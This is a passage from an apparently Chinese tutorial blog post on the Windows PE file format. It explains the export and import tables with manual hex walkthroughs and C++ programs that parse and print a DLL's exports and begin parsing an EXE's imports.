函数的序号</p><p>程序运行的时候，会检查主模块的导入表，看用了哪些其他模块，就会将此模块加载到进程空间中。加载进来之后，分析INT（IAT）得到函数名称，用这个名称去导出表中找到函数地址的RVA，RVA+模块基址，就是真正的函数地址，将此函数地址填充到IAT中，从而完成加载后的IAT功能。</p><p>一个PE文件，可以没有导出表的，比如exe文件，一般都没有。</p><p> 已知一个dll名,和一个dll导出函数的名字, 如何得到这个函数名的地址?</p><p>得到DLL的导出表，然后在函数名称表中找函数名，如果找到了，由于序号表和名称表位置是一一对应的，就会得到序号表的下标，然后就将序号当成地址表的下标，从而得到地址。</p><p>GetProcAddress();</p><p> 怎么才能知道一个exe都使用了哪些API?</p><p>分析exe的导入表即可，其中记录了模块名和函数名。</p><p> 如何判断导入函数是以序号导入或是以名称导入?</p><p>IMAGE_THUNK_DATA32这个结构体，他的最高位是1的话，那么就只有序号，如果最高位是0的话，那么久有序号，也有名称。</p><p> 怎么才知道导出函数是仅以序号导出还是以名称导出?</p><p>对于一个导出函数而言，他的地址表的下标，就是此函数的序号，如果这个序号，在序号表中，没有记录，那么他就是一个虚序号，也就是没有名称，只有序号。</p><h4 id="怎么找到一个PE文件的导出信息"><a href="#怎么找到一个PE文件的导出信息" class="headerlink" title="怎么找到一个PE文件的导出信息"></a>怎么找到一个PE文件的导出信息</h4><p>通过数据目录表的第0项：</p><h4 id="手工分析过程："><a href="#手工分析过程：" class="headerlink" title="手工分析过程："></a>手工分析过程：</h4><img src="PE文件/OutPutTab.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h5 id="获得信息："><a href="#获得信息：" class="headerlink" title="获得信息："></a>获得信息：</h5><p>导出表的RVA：00018D90  ——&gt;FOA： 7590                (FOA= RVA   - RVA区段+ FOA区段)</p><p>备注：    </p><p>​        FOA:文件的偏移位置</p><p>​        RVA：相对虚拟地址</p><p>​        RVA区段：该段段首地址</p><p>​        FOA区段：文件偏移的段首地址</p><p>SIZE：5F21</p><img src="PE文件/QuDuanTable.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>模块名称在12个字节后的四个字节中，也就是0x0001DBEA</p><p>Base:00 00 00 01 索引基数</p><p>NumberOfFunctions:00 00 13 88 导出地址表中成员个数</p><p>NumberOfNames:00 00 00 03</p><p>AddressOfFunctions(rva):00 01 8D B8    导出地址表（EAT）</p><p>AddressOfNames(rva):00 01 DB D8  导出名称表（ENT）</p><p>AddressOfNameOrdinals;：0x1DBE4         指向导出序号表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD  Characteristics;   &#x2F;&#x2F; (1) 保留，恒为0x00000000</span><br><span class="line">    DWORD  TimeDateStamp;   &#x2F;&#x2F; (2) 时间戳</span><br><span class="line">    WORD   MajorVersion;   &#x2F;&#x2F; (3) 主版本号，一般不赋值</span><br><span class="line">    WORD   MinorVersion;   &#x2F;&#x2F; (4) 子版本号，一般不赋值</span><br><span class="line">    DWORD  Name;   &#x2F;&#x2F; (5) 模块名称*</span><br><span class="line">    DWORD  Base;   &#x2F;&#x2F; (6) 索引基数*</span><br><span class="line">    DWORD  NumberOfFunctions;  &#x2F;&#x2F; (7) 导出地址表中成员个数*</span><br><span class="line">    DWORD  NumberOfNames;    &#x2F;&#x2F; (8) 导出名称表中成员个数*</span><br><span class="line">    DWORD  AddressOfFunctions; &#x2F;&#x2F; (9) 导出地址表（EAT）*</span><br><span class="line">    DWORD  AddressOfNames;   &#x2F;&#x2F; (10) 导出名称表（ENT）*</span><br><span class="line">    DWORD  AddressOfNameOrdinals; &#x2F;&#x2F; (11) 指向导出序号表*</span><br><span class="line">&#125;IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>模块名称0x0001DBEA  转换RVA —FOA: C3EA</p><img src="PE文件/dll导出名称.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>找到dll.dll</p><p>地址表成员个数为1388转换成字节：1388h=5000d        十六进制转换为十进制</p><p>​                                                                1388*4=4E20        十六进制数乘4</p><p>​                                                                5000*4=20000        十进制数乘4</p><p>我们从地址表：0x 18DB8开始找，由于18DB8是RVA，这里需要转换FOA:75B8</p><img src="PE文件/AddressTab.bmp" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>AddressOfNameOrdinals;：1DBE4         指向导出序号表 转换FOA:C3E4</p><img src="PE文件/序号表.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><img src="PE文件/OutImage.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH <span class="meta-string">L&quot;C:\\Users\\SouLinker\\Desktop\\dll.dll&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeExportsTabel</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (IsPE_File(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line">AnalyzeExportsTabel(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeExportsTabel</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导出表的结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"><span class="comment">//1 获取到导出表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pExportDir =  &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//1 导出表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用</span></span><br><span class="line">DWORD dwExportFOA = RvaToFoa(lpImage, pExportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//1 已经得到了FOA，直接就能够找到导出表的结构</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(lpImage + dwExportFOA);</span><br><span class="line"><span class="comment">//typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span></span><br><span class="line"><span class="comment">//DWORD   Characteristics;</span></span><br><span class="line"><span class="comment">//DWORD   TimeDateStamp;</span></span><br><span class="line"><span class="comment">//WORD    MajorVersion;</span></span><br><span class="line"><span class="comment">//WORD    MinorVersion;</span></span><br><span class="line"><span class="comment">//DWORD   Name;</span></span><br><span class="line"><span class="comment">//DWORD   Base;</span></span><br><span class="line"><span class="comment">//DWORD   NumberOfFunctions;</span></span><br><span class="line"><span class="comment">//DWORD   NumberOfNames;</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfFunctions;     // RVA from base of image</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfNames;         // RVA from base of image</span></span><br><span class="line"><span class="comment">//DWORD   AddressOfNameOrdinals;  // RVA from base of image</span></span><br><span class="line"><span class="comment">//&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;</span></span><br><span class="line">DWORD dwBase = pExport-&gt;Base;</span><br><span class="line"><span class="comment">//2 得到地址表，名称表，序号表的 FOA</span></span><br><span class="line">DWORD EatFoa = RvaToFoa(lpImage,pExport-&gt;AddressOfFunctions);</span><br><span class="line">DWORD EntFoa = RvaToFoa(lpImage, pExport-&gt;AddressOfNames);</span><br><span class="line">DWORD EotFoa = RvaToFoa(lpImage, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">//3 得到地址表，名称表，序号表在文件中的位置</span></span><br><span class="line">PDWORD  pEat= (PDWORD)(lpImage + EatFoa);</span><br><span class="line">PDWORD  pEnt = (PDWORD)(lpImage + EntFoa);</span><br><span class="line">PWORD pEot = (PWORD)(lpImage + EotFoa);</span><br><span class="line"><span class="comment">//4 开始解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfFunctions; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//4.1 无效地址</span></span><br><span class="line"><span class="keyword">if</span> (pEat[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2 有效地址将下标放到序号表中去寻找</span></span><br><span class="line"><span class="keyword">int</span>  j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> nSign = FALSE;</span><br><span class="line"><span class="keyword">for</span> (; j &lt; pExport-&gt;NumberOfNames; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == pEot[j])</span><br><span class="line">&#123;</span><br><span class="line">nSign = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2.1 找到了，就是有名字的函数</span></span><br><span class="line"><span class="keyword">if</span> (nSign== TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//名称表中，存储的是RVA，需要转为FOA</span></span><br><span class="line">DWORD dwFunNameFOA =  RvaToFoa(lpImage, pEnt[j]);</span><br><span class="line"><span class="keyword">char</span>* pFunName = lpImage + dwFunNameFOA;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;序号:%4x 地址:%x 名称:%s\n&quot;</span>, i+ dwBase, pEat[i], pFunName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.2.2 没有找到，就是没有名字的函数，虚序号</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;序号:%4x 地址:%x 名称:NULL\n&quot;</span>, i + dwBase, pEat[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h4 id="什么是导入"><a href="#什么是导入" class="headerlink" title="什么是导入"></a>什么是导入</h4><p>当一个可执行文件使用到了其他模块中的函数的时候，就是导入行为。在PE文件中，有一个位置记录了此可执行文件 使用的所有其他模块的函数信息。这个位置就是导入表。</p><p>导入表的作用是什么? </p><p>在加载之前，导入表里面记录本模块所使用的哪些DLL中的哪些函数的名称信息。</p><p>在加载之后，导入表能够记录所使用的函数的地址。供程序运行期间，找到所使用的函数。</p><p>导入表结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics; </span><br><span class="line">        DWORD OriginalFirstThunk;<span class="comment">//(1) 指向导入名称表(INT)的RAV*</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// (2) 时间标识</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">// (3) 转发链，如果不转发则此值为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">// (4) 指向导入映像文件的名字*</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">// (5) 指向导入地址表（IAT）的RAV*</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>OriginalFirstThunk与FirstThunk得到位置，也是一个结构体数组，定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;                                          <span class="comment">// (1) 转发字符串的RAV</span></span><br><span class="line">        PDWORD Function;                <span class="comment">// (2) 被导入函数的地址</span></span><br><span class="line">        DWORD Ordinal;                <span class="comment">// (3) 被导入函数的序号</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;    <span class="comment">// (4) 指向输入名称表</span></span><br><span class="line">&#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><ol><li>当此结构体最高位为0的时候，且此时存储的是导入名称信息，PIMAGE_IMPORT_BY_NAME起作用</li><li>当此结构体最高位为1的时候，且此时存储的是导入名称信息， DWORD Ordinal起作用</li><li>当此结构体存储的是导入地址信息的时候，PDWORD Function起作用</li></ol><h4 id="手工解析"><a href="#手工解析" class="headerlink" title="手工解析"></a>手工解析</h4><p>数据目录表的第1项，就是导入表信息：</p><img src="PE文件/InputInfo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>RVA：19CE90 ———》 转为FOA： B890</p><p>SIZE：0168</p><img src="PE文件/InputModle.bmp" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics; </span><br><span class="line">        DWORD OriginalFirstThunk;<span class="comment">//(1) 指向导入名称表(INT)的RAV*</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// (2) 时间标识</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">// (3) 转发链，如果不转发则此值为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">// (4) 指向导入映像文件的名字*</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">// (5) 指向导入地址表（IAT）的RAV*</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>Name:          0019E460 —–&gt; 19CE60</p><img src="PE文件/ModelName.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>OriginalFirstThunk: 0019D1CC —–&gt;19BBCC (INT)</p><img src="PE文件/INT.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>FirstThunk:       001504D4 —–&gt; 14EED4（IAT）</p><img src="PE文件/IAT.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>加载之后，INT中的内容还是原来的内容</p><p>在OD中，加载之后，IAT里面，存储的已经是各个API的地址了。</p><h4 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_解析导入表.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH <span class="meta-string">L&quot;C:\\Users\\hugan\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeImportTabel</span><span class="params">(<span class="keyword">char</span>* lpImage, <span class="keyword">bool</span> bAnalyzeInt)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span 